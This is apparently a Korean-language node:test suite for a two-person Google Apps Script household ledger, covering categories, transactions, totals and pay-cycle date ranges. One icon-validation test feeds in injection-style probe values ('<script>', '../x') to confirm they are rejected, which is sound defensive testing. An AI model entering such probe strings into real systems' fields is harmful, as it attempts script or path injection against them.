import { test } from 'node:test';
import assert from 'node:assert/strict';
import { loadGas } from './helpers/gas-sandbox.js';

const 지민 = 'jimin@example.com';
const 수호 = 'suho@example.com';

/** 두 사람이 들어와 있는 새 가계부 시트 */
function freshLedger() {
  const gas = loadGas({ owner: 지민, editors: [수호] });
  gas.call('getBootstrap', '2026-08');   // 지민 첫 접속
  gas.loginAs(수호);
  gas.call('getBootstrap', '2026-08');   // 수호 첫 접속
  gas.loginAs(지민);
  return gas;
}

const catId = (gas, name) => {
  const c = gas.call('readCategories_').find((x) => x.name === name);
  assert.ok(c, `'${name}' 카테고리를 찾지 못했습니다.`);
  return c.id;
};

test('처음 열면 시트 5개와 기본 대분류·소분류가 만들어진다', () => {
  const gas = loadGas();
  const boot = gas.call('getBootstrap', '2026-08');

  assert.deepEqual(gas.sheetNames(), ['내역', '대분류', '카테고리', '멤버', '설정']);
  assert.deepEqual(gas.dump('내역')[0], ['ID', '날짜', '구분', '금액', '카테고리', '메모', '작성자', '기록시각']);

  const expense = boot.categories.filter((c) => c.kind === 'expense');
  const income = boot.categories.filter((c) => c.kind === 'income');

  // 처음 물어보신 다섯 가지는 그대로 들어 있어야 한다
  for (const name of ['식비', '여가생활', '취미', '운동', '병원']) {
    assert.ok(expense.some((c) => c.name === name), `${name} 없음`);
  }
  assert.ok(expense.length >= 15, `지출 카테고리가 ${expense.length}개뿐`);
  assert.ok(income.length >= 5, `수입 카테고리가 ${income.length}개뿐`);

  // 모두 아이콘 열쇠말과 색을 갖는다
  for (const c of boot.categories) {
    assert.match(c.icon, /^[a-z][a-z0-9-]*$/, `${c.name} 아이콘: ${c.icon}`);
    assert.match(c.color, /^#[0-9a-f]{6}$/i, `${c.name} 색상: ${c.color}`);
  }
  assert.equal(expense.find((c) => c.name === '식비').icon, 'food');
  assert.equal(income.find((c) => c.name === '급여').icon, 'money');
  assert.deepEqual(gas.dump('카테고리')[0], ['ID', '구분', '대분류', '이름', '아이콘', '사용']);
  assert.deepEqual(gas.dump('대분류')[0], ['ID', '구분', '이름', '색상', '사용']);
});

test('대분류는 5~10개 사이이고, 소분류가 하나도 빠짐없이 들어간다', () => {
  const gas = loadGas();
  const boot = gas.call('getBootstrap', '2026-08');

  const groups = boot.groups;
  assert.ok(groups.length >= 5 && groups.length <= 10, `대분류가 ${groups.length}개`);

  // 모든 소분류는 실제로 있는 대분류를 가리킨다
  const known = new Set(groups.map((g) => g.kind + ':' + g.name));
  for (const c of boot.categories) {
    assert.ok(known.has(c.kind + ':' + c.group), `${c.name} → 없는 대분류 ${c.group}`);
  }
  // 빈 대분류는 없다
  for (const g of groups) {
    assert.ok(boot.categories.some((c) => c.kind === g.kind && c.group === g.name), `${g.name} 비어 있음`);
  }
  // 같은 구분 안에서는 그림이 겹치지 않는다 ('기타'/'기타수입'만 같은 그림을 나눠 쓴다)
  ['expense', 'income'].forEach((kind) => {
    const icons = boot.categories.filter((c) => c.kind === kind).map((c) => c.icon);
    assert.equal(new Set(icons).size, icons.length, `${kind} 안에 겹치는 그림`);
  });
});

test('소분류 색은 대분류에서 물려받는다', () => {
  const gas = loadGas();
  const boot = gas.call('getBootstrap', '2026-08');
  const 먹고 = boot.groups.find((g) => g.name === '먹고 마시기');

  ['식비', '카페·간식', '장보기'].forEach((name) => {
    assert.equal(boot.categories.find((c) => c.name === name).color, 먹고.color, name);
  });

  // 대분류 색을 바꾸면 딸린 소분류가 전부 따라온다
  const after = gas.call('updateGroup', { id: 먹고.id, color: '#123456' });
  ['식비', '카페·간식', '장보기'].forEach((name) => {
    assert.equal(after.categories.find((c) => c.name === name).color, '#123456', name);
  });
});

test('두 번 열어도 기본 카테고리가 중복으로 생기지 않는다', () => {
  const gas = loadGas();
  gas.call('getBootstrap', '2026-08');
  const first = gas.call('getBootstrap', '2026-08');
  const after = gas.call('getBootstrap', '2026-08');
  assert.equal(after.categories.length, first.categories.length);
});

test('접속한 사람이 멤버 시트에 자동 등록된다', () => {
  const gas = freshLedger();
  const boot = gas.call('getBootstrap', '2026-08');
  assert.equal(boot.me.email, 지민);
  assert.deepEqual(boot.members.map((m) => m.email).sort(), [지민, 수호].sort());
  // 같은 사람이 여러 번 들어와도 한 줄만 쌓인다.
  gas.call('getBootstrap', '2026-08');
  assert.equal(gas.dump('멤버').length - 1, 2);
});

test('표시 이름을 바꾸면 내역에도 반영된다', () => {
  const gas = freshLedger();
  gas.call('renameMe', '지민');
  gas.loginAs(수호);
  gas.call('renameMe', '수호');

  gas.call('addTransaction', {
    kind: 'expense', amount: 12000, date: '2026-08-10', categoryId: catId(gas, '식비'), memo: '점심',
  });
  const data = gas.call('getMonthData', '2026-08');
  assert.equal(data.transactions[0].userName, '수호');
  assert.deepEqual(data.summary.byMember.map((m) => m.name).sort(), ['수호', '지민']);
});

test('시트에는 사람이 읽을 수 있는 값으로 저장된다', () => {
  const gas = freshLedger();
  gas.call('addTransaction', {
    kind: 'expense', amount: 42000, date: '2026-08-03', categoryId: catId(gas, '식비'), memo: '장보기',
  });
  const row = gas.dump('내역')[1];
  assert.ok(row[1] instanceof Date, '날짜 칸은 진짜 날짜여야 시트에서 정렬·필터가 된다');
  assert.equal(row[1].getFullYear(), 2026);
  assert.equal(row[1].getMonth() + 1, 8);
  assert.equal(row[1].getDate(), 3);
  assert.equal(row[3], 42000);
  assert.equal(row[4], '식비', '카테고리는 이름으로 저장되어야 시트에서 알아볼 수 있다');
  assert.equal(row[5], '장보기');
  assert.equal(row[6], 지민);
});

test('두 사람이 번갈아 넣어도 서로 덮어쓰지 않는다', () => {
  const gas = freshLedger();
  const 식비 = catId(gas, '식비');
  for (let i = 1; i <= 10; i += 1) {
    gas.loginAs(i % 2 ? 지민 : 수호);
    gas.call('addTransaction', {
      kind: 'expense', amount: 1000 * i, date: `2026-08-${String(i).padStart(2, '0')}`,
      categoryId: 식비, memo: `${i}번째`,
    });
  }
  const data = gas.call('getMonthData', '2026-08');
  assert.equal(data.transactions.length, 10, '열 건 모두 남아야 한다');
  assert.equal(data.summary.total.expense, 55000);
  const ids = new Set(data.transactions.map((t) => t.id));
  assert.equal(ids.size, 10, 'ID 가 겹치면 안 된다');
});

test('잘못된 입력은 막는다', () => {
  const gas = freshLedger();
  const cases = [
    [{ kind: 'expense', amount: -100, date: '2026-08-01' }, /0보다 큰 정수/],
    [{ kind: 'expense', amount: 0, date: '2026-08-01' }, /0보다 큰 정수/],
    [{ kind: 'expense', amount: 1000.5, date: '2026-08-01' }, /0보다 큰 정수/],
    [{ kind: 'expense', amount: 1000, date: '2026-02-31' }, /존재하지 않는 날짜/],
    [{ kind: 'expense', amount: 1000, date: '엉터리' }, /YYYY-MM-DD/],
    [{ kind: '아무거나', amount: 1000, date: '2026-08-01' }, /수입 또는 지출/],
  ];
  for (const [payload, pattern] of cases) {
    assert.throws(() => gas.call('addTransaction', payload), pattern, JSON.stringify(payload));
  }
  // 수입인데 지출 카테고리를 붙이는 경우
  assert.throws(
    () => gas.call('addTransaction', {
      kind: 'income', amount: 1000, date: '2026-08-01', categoryId: catId(gas, '식비'),
    }),
    /구분과 카테고리가 맞지 않습니다/
  );
});

test('금액에 콤마나 원을 붙여도 알아듣는다', () => {
  const gas = freshLedger();
  gas.call('addTransaction', {
    kind: 'expense', amount: '1,234,000원', date: '2026-08-05', categoryId: catId(gas, '식비'),
  });
  assert.equal(gas.call('getMonthData', '2026-08').summary.total.expense, 1234000);
});

/* ---------- 집계 ---------- */

function seeded() {
  const gas = freshLedger();
  gas.call('renameMe', '지민');
  gas.loginAs(수호);
  gas.call('renameMe', '수호');

  const rows = [
    [지민, 'income', 3200000, '2026-08-25', '급여', '8월 급여'],
    [수호, 'income', 2750000, '2026-08-25', '급여', '8월 급여'],
    [수호, 'income', 150000, '2026-08-14', '기타수입', '중고 판매'],
    [지민, 'expense', 62000, '2026-08-02', '식비', '주말 장보기'],
    [수호, 'expense', 38000, '2026-08-05', '식비', '점심 회식'],
    [지민, 'expense', 145000, '2026-08-08', '여가생활', '뮤지컬'],
    [수호, 'expense', 43000, '2026-08-19', '병원', '치과'],
    [지민, 'expense', 89000, '2026-08-14', '운동', '헬스장'],
    [수호, 'expense', 90000, '2026-09-02', '취미', '다음 달 내역'],
  ];
  for (const [who, kind, amount, date, cat, memo] of rows) {
    gas.loginAs(who);
    gas.call('addTransaction', { kind, amount, date, categoryId: catId(gas, cat), memo });
  }
  gas.loginAs(지민);
  return gas;
}

test('합산: 총 수입 · 총 지출 · 차액이 맞는다', () => {
  const { summary } = seeded().call('getMonthData', '2026-08');
  assert.equal(summary.total.income, 6_100_000);
  assert.equal(summary.total.expense, 377_000);
  assert.equal(summary.total.balance, 5_723_000);
  assert.equal(summary.transactionCount, 8, '9월 내역은 8월 집계에서 빠진다');
});

test('각각: 사람별 수입 · 지출 · 차액이 나뉘고 합치면 총액이 된다', () => {
  const { summary } = seeded().call('getMonthData', '2026-08');
  const find = (name) => summary.byMember.find((m) => m.name === name);

  assert.deepEqual(
    (({ income, expense, balance }) => ({ income, expense, balance }))(find('지민')),
    { income: 3_200_000, expense: 296_000, balance: 2_904_000 }
  );
  assert.deepEqual(
    (({ income, expense, balance }) => ({ income, expense, balance }))(find('수호')),
    { income: 2_900_000, expense: 81_000, balance: 2_819_000 }
  );
  assert.equal(find('지민').income + find('수호').income, summary.total.income);
  assert.equal(find('지민').expense + find('수호').expense, summary.total.expense);
});

test('카테고리별 집계에 사람별 몫이 함께 담기고 큰 금액순으로 정렬된다', () => {
  const { summary } = seeded().call('getMonthData', '2026-08');
  const 식비 = summary.byCategory.find((c) => c.name === '식비');
  assert.equal(식비.total, 100_000);
  assert.equal(식비.perUser[지민], 62_000);
  assert.equal(식비.perUser[수호], 38_000);

  const expenses = summary.byCategory.filter((c) => c.kind === 'expense').map((c) => c.total);
  assert.deepEqual(expenses, [...expenses].sort((a, b) => b - a));
});

test('내역은 최신 날짜부터 보인다', () => {
  const { transactions } = seeded().call('getMonthData', '2026-08');
  const dates = transactions.map((t) => t.date);
  assert.deepEqual(dates, [...dates].sort().reverse());
});

/* ---------- 수정 · 삭제 ---------- */

test('상대가 올린 내역도 고치고 지울 수 있다', () => {
  const gas = seeded();
  const 치과 = gas.call('getMonthData', '2026-08').transactions.find((t) => t.memo === '치과');
  assert.equal(치과.userName, '수호');

  // 지민이 수호 내역을 수정
  const afterEdit = gas.call('updateTransaction', { id: 치과.id, amount: 55000, memo: '치과 (추가 치료)' });
  const edited = afterEdit.transactions.find((t) => t.id === 치과.id);
  assert.equal(edited.amount, 55_000);
  assert.equal(edited.userName, '수호', '작성자는 그대로 유지되어야 한다');
  assert.equal(afterEdit.summary.total.expense, 389_000);

  const afterDelete = gas.call('deleteTransaction', 치과.id, '2026-08');
  assert.equal(afterDelete.summary.total.expense, 334_000);
  assert.equal(afterDelete.transactions.length, 7);
});

test('이미 지워진 내역을 또 지우면 안내 메시지가 나온다', () => {
  const gas = seeded();
  const tx = gas.call('getMonthData', '2026-08').transactions[0];
  gas.call('deleteTransaction', tx.id, '2026-08');
  assert.throws(() => gas.call('deleteTransaction', tx.id, '2026-08'), /이미 지웠을 수 있어요/);
  assert.throws(() => gas.call('updateTransaction', { id: tx.id, amount: 100 }), /방금 지웠을 수 있어요/);
});

test('화면에서 작성자를 함께 보내도 수정이 된다', () => {
  const gas = seeded();
  const 치과 = gas.call('getMonthData', '2026-08').transactions.find((t) => t.memo === '치과');
  assert.equal(치과.userName, '수호');

  // 화면의 '누가?' 칸은 늘 채워져 있어서 userEmail 이 같이 넘어온다
  const 그대로 = gas.call('updateTransaction', { id: 치과.id, amount: 55000, userEmail: 수호 });
  assert.equal(그대로.transactions.find((t) => t.id === 치과.id).userName, '수호');

  // 작성자를 나로 바꾸기
  const 바꿈 = gas.call('updateTransaction', { id: 치과.id, userEmail: 지민 });
  assert.equal(바꿈.transactions.find((t) => t.id === 치과.id).userName, '지민');

  // 함께 쓰지 않는 사람은 작성자가 될 수 없다
  assert.throws(
    () => gas.call('updateTransaction', { id: 치과.id, userEmail: 'stranger@example.com' }),
    /함께 쓰는 사람만/,
  );
});

test('날짜를 다른 달로 바꾸면 그 달로 옮겨간다', () => {
  const gas = seeded();
  const tx = gas.call('getMonthData', '2026-08').transactions.find((t) => t.memo === '헬스장');
  const moved = gas.call('updateTransaction', { id: tx.id, date: '2026-09-14' });
  assert.equal(moved.month, '2026-09');
  assert.ok(!gas.call('getMonthData', '2026-08').transactions.some((t) => t.id === tx.id));
  assert.ok(gas.call('getMonthData', '2026-09').transactions.some((t) => t.id === tx.id));
});

/* ---------- 카테고리 관리 ---------- */

test('카테고리를 추가하고 중복은 막는다', () => {
  const gas = freshLedger();
  const { categories, groups } = gas.call('addCategory', {
    kind: 'expense', group: '즐기기', name: '캠핑', icon: 'plane',
  });
  const added = categories.find((c) => c.name === '캠핑');
  assert.equal(added.group, '즐기기');
  assert.equal(added.icon, 'plane');
  assert.equal(added.color, groups.find((g) => g.kind === 'expense' && g.name === '즐기기').color);

  assert.throws(() => gas.call('addCategory', { kind: 'expense', group: '즐기기', name: '캠핑' }), /이미 있습니다/);
  // 구분이 다르면 같은 이름을 써도 된다.
  assert.doesNotThrow(() => gas.call('addCategory', { kind: 'income', group: '그 밖에', name: '캠핑' }));
  // 없는 대분류는 막는다
  assert.throws(() => gas.call('addCategory', { kind: 'expense', group: '없는것', name: 'X' }), /그런 대분류가 없습니다/);
});

test('소분류를 다른 대분류로 옮길 수 있다', () => {
  const gas = freshLedger();
  const id = catId(gas, '여행');
  assert.equal(gas.call('readCategories_').find((c) => c.id === id).group, '즐기기');

  const after = gas.call('updateCategory', { id, group: '이동' });
  const moved = after.categories.find((c) => c.id === id);
  assert.equal(moved.group, '이동');
  assert.equal(moved.color, after.groups.find((g) => g.kind === 'expense' && g.name === '이동').color);
});

test('대분류 이름을 바꾸면 딸린 소분류가 따라온다', () => {
  const gas = freshLedger();
  const g = gas.call('readGroups_').find((x) => x.name === '먹고 마시기');
  const after = gas.call('updateGroup', { id: g.id, name: '식생활' });
  assert.ok(!after.categories.some((c) => c.group === '먹고 마시기'));
  assert.equal(after.categories.find((c) => c.name === '식비').group, '식생활');
});

test('소분류가 딸린 대분류는 지워지지 않고 숨겨진다', () => {
  const gas = freshLedger();
  const g = gas.call('readGroups_').find((x) => x.name === '건강');
  const res = gas.call('deleteGroup', g.id);
  assert.equal(res.archived, true);
  assert.ok(res.usedCount >= 3);
  assert.equal(res.groups.find((x) => x.id === g.id).isActive, false);

  // 빈 대분류는 그냥 지워진다
  const empty = gas.call('addGroup', { kind: 'expense', name: '빈칸', color: '#abcdef' })
    .groups.find((x) => x.name === '빈칸');
  const gone = gas.call('deleteGroup', empty.id);
  assert.equal(gone.archived, false);
  assert.ok(!gone.groups.some((x) => x.name === '빈칸'));
});

test('아이콘을 바꿀 수 있고 이상한 값은 막는다', () => {
  const gas = freshLedger();
  const id = catId(gas, '식비');
  const { categories } = gas.call('updateCategory', { id, icon: 'cafe' });
  assert.equal(categories.find((c) => c.id === id).icon, 'cafe');

  // 아이콘을 안 주면 기본값
  const plain = gas.call('addCategory', { kind: 'expense', group: '그 밖에', name: '아이콘없음' }).categories
    .find((c) => c.name === '아이콘없음');
  assert.equal(plain.icon, 'dots');

  const bads = ['<script>', 'A B', '한글', '../x', 'x'.repeat(30)];
  bads.forEach((bad, i) => {
    assert.throws(() => gas.call('addCategory', { kind: 'expense', group: '그 밖에', name: '나쁨' + i, icon: bad }),
      /아이콘 값이 올바르지 않습니다/, String(bad));
  });
});

test('내역과 집계에도 카테고리 아이콘이 실린다', () => {
  const gas = freshLedger();
  gas.call('addTransaction', {
    kind: 'expense', amount: 9000, date: '2026-08-05', categoryId: catId(gas, '카페·간식'), memo: '라떼',
  });
  const data = gas.call('getMonthData', '2026-08');
  assert.equal(data.transactions[0].categoryIcon, 'cafe');
  assert.equal(data.summary.byCategory.find((c) => c.name === '카페·간식').icon, 'cafe');
});

test('예전 한 단계 시트를 열면 대분류·소분류로 옮겨진다', () => {
  const gas = loadGas();
  gas.call('ensureSheets_');
  // 예전 형식(ID|구분|이름|색상|아이콘|사용)으로 되돌려 놓는다
  gas.context.sheet_('카테고리').data = [
    ['ID', '구분', '이름', '색상', '아이콘', '사용'],
    ['old1', 'expense', '식비', '#f97316', 'food', true],
    ['old2', 'income', '급여', '#3b82f6', 'money', true],
    ['old3', 'expense', '내가만든것', '#123456', 'star', true],
  ];
  gas.context.sheet_('대분류').data = [];
  // 예전 시트를 처음 여는 상황이므로, 구조를 확인했다는 기억도 없어야 한다
  gas.forgetCache();
  gas.call('ensureSheets_');

  const rows = gas.dump('카테고리');
  assert.deepEqual(rows[0], ['ID', '구분', '대분류', '이름', '아이콘', '사용']);
  // 아는 이름은 제자리 대분류로, ID 와 그림은 지킨다
  assert.deepEqual(rows[1], ['old1', 'expense', '먹고 마시기', '식비', 'food', true]);
  assert.deepEqual(rows[2], ['old2', 'income', '버는 돈', '급여', 'money', true]);
  // 모르는 이름은 '그 밖에'로
  assert.deepEqual(rows[3], ['old3', 'expense', '그 밖에', '내가만든것', 'star', true]);

  // 대분류 시트도 채워지고 색이 물려진다
  const cats = gas.call('readCategories_');
  const groups = gas.call('readGroups_');
  assert.ok(groups.length >= 5);
  assert.equal(cats.find((c) => c.name === '식비').color,
    groups.find((g) => g.kind === 'expense' && g.name === '먹고 마시기').color);
});

test('카테고리 이름을 바꾸면 지난 내역의 표시도 함께 바뀐다', () => {
  const gas = seeded();
  const id = catId(gas, '여가생활');
  gas.call('updateCategory', { id, name: '문화생활' });

  const data = gas.call('getMonthData', '2026-08');
  assert.ok(!data.transactions.some((t) => t.categoryName === '여가생활'));
  const moved = data.transactions.find((t) => t.memo === '뮤지컬');
  assert.equal(moved.categoryName, '문화생활');
  assert.ok(data.summary.byCategory.some((c) => c.name === '문화생활' && c.total === 145_000));
  assert.equal(data.summary.total.expense, 377_000, '이름만 바뀌고 금액은 그대로여야 한다');
});

test('안 쓴 카테고리는 지워지고, 쓴 카테고리는 숨겨진다', () => {
  const gas = seeded();

  const unused = gas.call('addCategory', { kind: 'expense', group: '그 밖에', name: '안쓰는것' }).categories
    .find((c) => c.name === '안쓰는것');
  const gone = gas.call('deleteCategory', unused.id);
  assert.equal(gone.archived, false);
  assert.ok(!gone.categories.some((c) => c.name === '안쓰는것'));

  const used = gas.call('deleteCategory', catId(gas, '운동'));
  assert.equal(used.archived, true);
  assert.equal(used.usedCount, 1);
  const hidden = used.categories.find((c) => c.name === '운동');
  assert.equal(hidden.isActive, false, '목록에서 숨겨질 뿐 사라지지는 않는다');

  const data = gas.call('getMonthData', '2026-08');
  assert.ok(data.transactions.some((t) => t.categoryName === '운동'), '지난 내역은 그대로 남아야 한다');
  assert.equal(data.summary.total.expense, 377_000);
});

test('숨긴 카테고리를 되살릴 수 있다', () => {
  const gas = seeded();
  const id = catId(gas, '운동');
  gas.call('deleteCategory', id);
  const back = gas.call('updateCategory', { id, isActive: true });
  assert.equal(back.categories.find((c) => c.name === '운동').isActive, true);
});

test('같은 이름으로 다시 추가하면 숨겨둔 카테고리가 되살아난다', () => {
  const gas = seeded();
  gas.call('deleteCategory', catId(gas, '운동'));
  const { categories } = gas.call('addCategory', { kind: 'expense', group: '건강', name: '운동' });
  const revived = categories.filter((c) => c.name === '운동' && c.kind === 'expense');
  assert.equal(revived.length, 1, '중복으로 늘어나면 안 된다');
  assert.equal(revived[0].isActive, true);
});

/* ---------- 사람이 시트를 직접 건드린 경우 ---------- */

test('시트에서 직접 고친 값도 앱이 알아본다', () => {
  const gas = seeded();
  const sheet = gas.context.sheet_('내역');

  // 사람이 시트에서 금액을 고치고, 날짜를 문자열로 적고, 빈 줄을 남긴 상황
  sheet.getRange(2, 4).setValue(99000);
  sheet.getRange(3, 2).setValue('2026-08-07');
  sheet.appendRow(['', '', '', '', '', '', '', '']);

  const data = gas.call('getMonthData', '2026-08');
  assert.equal(data.transactions.length, 8, '빈 줄은 무시한다');
  assert.ok(data.transactions.some((t) => t.amount === 99000), '시트에서 고친 금액이 반영된다');
  assert.ok(data.transactions.some((t) => t.date === '2026-08-07'), '문자열로 적은 날짜도 읽는다');
});

test('로그인 정보를 못 읽으면 알려준다', () => {
  const gas = loadGas();
  gas.loginAs('');
  assert.throws(() => gas.call('getBootstrap', '2026-08'), /구글 로그인 정보를 읽지 못했습니다/);
});

/* ================================================================== */
/* 월 시작일 (급여일 기준 주기)                                          */
/* ================================================================== */

test('기본값은 달력과 같은 1일 시작이다', () => {
  const gas = freshLedger();
  const data = gas.call('getMonthData', '2026-08');
  assert.equal(data.settings.startDay, 1);
  assert.deepEqual(data.range, { from: '2026-08-01', to: '2026-08-31' });
});

test('시작일을 24로 두면 8월은 7월 24일 ~ 8월 23일이 된다', () => {
  const gas = freshLedger();
  const after = gas.call('updateSettings', { startDay: 24, month: '2026-08' });
  assert.equal(after.settings.startDay, 24);
  assert.deepEqual(after.range, { from: '2026-07-24', to: '2026-08-23' });
});

test('시작일이 바뀌면 내역이 해당 주기로 다시 묶인다', () => {
  const gas = freshLedger();
  const 식비 = catId(gas, '식비');
  const 급여 = catId(gas, '급여');
  const put = (kind, amount, date, cat) =>
    gas.call('addTransaction', { kind, amount, date, categoryId: cat, memo: date });

  put('income', 3000000, '2026-07-24', 급여);  // 7월 급여일 → 8월 주기
  put('expense', 10000, '2026-07-25', 식비);   // 8월 주기
  put('expense', 20000, '2026-08-23', 식비);   // 8월 주기 마지막 날
  put('expense', 40000, '2026-08-24', 식비);   // 9월 주기로 넘어감
  put('expense', 80000, '2026-07-23', 식비);   // 7월 주기

  gas.call('updateSettings', { startDay: 24, month: '2026-08' });

  const aug = gas.call('getMonthData', '2026-08');
  assert.deepEqual(aug.range, { from: '2026-07-24', to: '2026-08-23' });
  assert.deepEqual(aug.transactions.map((t) => t.memo).sort(),
    ['2026-07-24', '2026-07-25', '2026-08-23']);
  assert.equal(aug.summary.total.income, 3_000_000);
  assert.equal(aug.summary.total.expense, 30_000);

  const sep = gas.call('getMonthData', '2026-09');
  assert.deepEqual(sep.range, { from: '2026-08-24', to: '2026-09-23' });
  assert.deepEqual(sep.transactions.map((t) => t.memo), ['2026-08-24']);

  const jul = gas.call('getMonthData', '2026-07');
  assert.deepEqual(jul.range, { from: '2026-06-24', to: '2026-07-23' });
  assert.deepEqual(jul.transactions.map((t) => t.memo), ['2026-07-23']);
});

test('주기가 서로 겹치거나 비는 날 없이 이어진다', () => {
  const gas = freshLedger();
  for (const startDay of [1, 5, 24, 28, 29, 30, 31]) {
    gas.call('updateSettings', { startDay, month: '2026-01' });
    let prevTo = null;
    for (let m = 1; m <= 12; m += 1) {
      const label = `2026-${String(m).padStart(2, '0')}`;
      const { range } = gas.call('getMonthData', label);
      assert.ok(range.from <= range.to, `${startDay}일 시작 ${label}: ${range.from} > ${range.to}`);
      if (prevTo) {
        const next = new Date(`${prevTo}T00:00:00Z`);
        next.setUTCDate(next.getUTCDate() + 1);
        assert.equal(range.from, next.toISOString().slice(0, 10),
          `${startDay}일 시작: ${prevTo} 다음이 ${range.from} 이면 안 된다`);
      }
      prevTo = range.to;
    }
  }
});

test('31일 시작이어도 2월에서 깨지지 않는다', () => {
  const gas = freshLedger();
  gas.call('updateSettings', { startDay: 31, month: '2026-03' });
  // 2026년 2월은 28일까지 → 경계가 28일로 당겨진다
  assert.deepEqual(gas.call('getMonthData', '2026-02').range, { from: '2026-01-31', to: '2026-02-27' });
  assert.deepEqual(gas.call('getMonthData', '2026-03').range, { from: '2026-02-28', to: '2026-03-30' });
});

test('연말을 넘어가도 이어진다', () => {
  const gas = freshLedger();
  gas.call('updateSettings', { startDay: 24, month: '2026-01' });
  assert.deepEqual(gas.call('getMonthData', '2026-01').range, { from: '2025-12-24', to: '2026-01-23' });
  assert.deepEqual(gas.call('getMonthData', '2027-01').range, { from: '2026-12-24', to: '2027-01-23' });
});

test('저장하면 그 날짜가 속한 주기가 돌아온다', () => {
  const gas = freshLedger();
  gas.call('updateSettings', { startDay: 24, month: '2026-08' });
  const 식비 = catId(gas, '식비');

  const a = gas.call('addTransaction', { kind: 'expense', amount: 5000, date: '2026-08-25', categoryId: 식비 });
  assert.equal(a.month, '2026-09', '8월 25일은 9월 주기다');

  const b = gas.call('addTransaction', { kind: 'expense', amount: 5000, date: '2026-08-23', categoryId: 식비 });
  assert.equal(b.month, '2026-08');

  // 수정으로 날짜를 옮기면 주기도 따라 옮겨간다
  const tx = b.transactions.find((t) => t.date === '2026-08-23');
  const moved = gas.call('updateTransaction', { id: tx.id, date: '2026-08-24' });
  assert.equal(moved.month, '2026-09');
});

test('잘못된 시작일은 막는다', () => {
  const gas = freshLedger();
  for (const bad of [0, 32, -1, 1.5, 'abc', null]) {
    assert.throws(() => gas.call('updateSettings', { startDay: bad }), /1에서 31 사이/, String(bad));
  }
});

test('시작일과 종료일이 시트에 사람이 읽을 수 있게 저장된다', () => {
  const gas = freshLedger();
  gas.call('updateSettings', { startDay: 24, month: '2026-08' });

  const rows = gas.dump('설정');
  assert.deepEqual(rows[0], ['항목', '값', '설명']);
  assert.equal(rows[1][0], '월 시작일');
  assert.equal(rows[1][1], 24);
  assert.equal(rows[2][0], '월 종료일');
  assert.equal(rows[2][1], 23, '시작일만 바꾸면 종료일은 그 앞날로 맞춰져야 합니다');

  // 시트에서 직접 고쳐도 앱이 따라간다
  const 설정 = gas.context.sheet_('설정');
  설정.getRange(2, 2).setValue(10);
  설정.getRange(3, 2).setValue(9);
  assert.deepEqual(gas.call('getMonthData', '2026-08').range, { from: '2026-07-10', to: '2026-08-09' });
});

test('설정 시트 값이 엉망이면 기본값으로 돌아간다', () => {
  const gas = freshLedger();
  gas.context.sheet_('설정').getRange(2, 2).setValue('아무거나');
  const data = gas.call('getMonthData', '2026-08');
  assert.equal(data.settings.startDay, 1);
  assert.deepEqual(data.range, { from: '2026-08-01', to: '2026-08-31' });
});

/* ================================================================== */
/* 연도가 바뀌어도 / 윤년에도 맞는가                                      */
/* (달력을 어디서 받아오지 않고 날짜 계산으로 만들기 때문에 확인해 둔다)     */
/* ================================================================== */

test('먼 미래 연도에도 주기가 정확히 이어진다', () => {
  const gas = freshLedger();
  gas.call('updateSettings', { startDay: 24, month: '2026-01' });

  const cases = [
    ['2027-01', '2026-12-24', '2027-01-23'],
    ['2028-03', '2028-02-24', '2028-03-23'],
    ['2030-12', '2030-11-24', '2030-12-23'],
    ['2031-01', '2030-12-24', '2031-01-23'],
    ['2099-12', '2099-11-24', '2099-12-23'],
    ['2100-01', '2099-12-24', '2100-01-23'],
  ];
  for (const [label, from, to] of cases) {
    assert.deepEqual(gas.call('getMonthData', label).range, { from, to }, label);
  }
});

test('윤년 2월 29일이 제대로 잡힌다', () => {
  const gas = freshLedger();

  // 2028년은 윤년, 2027·2029년은 아니다
  gas.call('updateSettings', { startDay: 1, month: '2028-02' });
  assert.deepEqual(gas.call('getMonthData', '2028-02').range, { from: '2028-02-01', to: '2028-02-29' });
  assert.deepEqual(gas.call('getMonthData', '2027-02').range, { from: '2027-02-01', to: '2027-02-28' });
  assert.deepEqual(gas.call('getMonthData', '2029-02').range, { from: '2029-02-01', to: '2029-02-28' });

  // 2100년은 4로 나뉘지만 윤년이 아니다 (100으로 나뉘고 400으로는 안 나뉨)
  assert.deepEqual(gas.call('getMonthData', '2100-02').range, { from: '2100-02-01', to: '2100-02-28' });
  // 2000년은 400으로 나뉘므로 윤년
  assert.deepEqual(gas.call('getMonthData', '2000-02').range, { from: '2000-02-01', to: '2000-02-29' });

  // 윤년 2월 29일에 기록해도 그 달에 잡힌다
  const tx = gas.call('addTransaction', {
    kind: 'expense', amount: 29000, date: '2028-02-29', categoryId: catId(gas, '식비'), memo: '윤년',
  });
  assert.equal(tx.month, '2028-02');
  assert.ok(tx.transactions.some((t) => t.date === '2028-02-29'));
});

test('31일 시작 + 윤년 2월도 어긋나지 않는다', () => {
  const gas = freshLedger();
  gas.call('updateSettings', { startDay: 31, month: '2028-02' });
  // 2028년 2월은 29일까지 → 경계가 29일로 당겨진다
  assert.deepEqual(gas.call('getMonthData', '2028-02').range, { from: '2028-01-31', to: '2028-02-28' });
  assert.deepEqual(gas.call('getMonthData', '2028-03').range, { from: '2028-02-29', to: '2028-03-30' });
});

test('앞으로 20년 어느 달에도 구멍이나 겹침이 없다', () => {
  const gas = freshLedger();
  for (const startDay of [1, 24, 29, 31]) {
    gas.call('updateSettings', { startDay, month: '2026-01' });
    let prevTo = null;
    for (let year = 2026; year <= 2046; year += 1) {
      for (let m = 1; m <= 12; m += 1) {
        const label = `${year}-${String(m).padStart(2, '0')}`;
        const { range } = gas.call('getMonthData', label);
        assert.ok(range.from <= range.to, `${startDay}일 ${label}`);
        if (prevTo) {
          const next = new Date(`${prevTo}T00:00:00Z`);
          next.setUTCDate(next.getUTCDate() + 1);
          assert.equal(range.from, next.toISOString().slice(0, 10),
            `${startDay}일 시작: ${prevTo} 다음이 ${range.from}`);
        }
        prevTo = range.to;
      }
    }
  }
});

/* ================================================================== */
/* 홈 화면 아이콘 주소                                                  */
/* ================================================================== */

/* ------------------------------------------------------------------ */
/* 여는 속도                                                            */
/* ------------------------------------------------------------------ */

/* ================================================================== */
/* 화면에서 오는 요청 받기 (doPost)                                     */
/* ================================================================== */

/** 클라이언트 ID 를 정해둔, 두 사람이 들어와 있는 가계부 */
function withClientId() {
  const gas = loadGas({ owner: 지민, editors: [수호] });
  gas.context.CLIENT_ID = 'my-app.apps.googleusercontent.com';
  gas.call('ensureSheets_');
  return gas;
}

test('초대받은 사람은 증명서로 들어올 수 있다', () => {
  const gas = withClientId();
  const good = gas.issueToken('good', { email: 지민 });

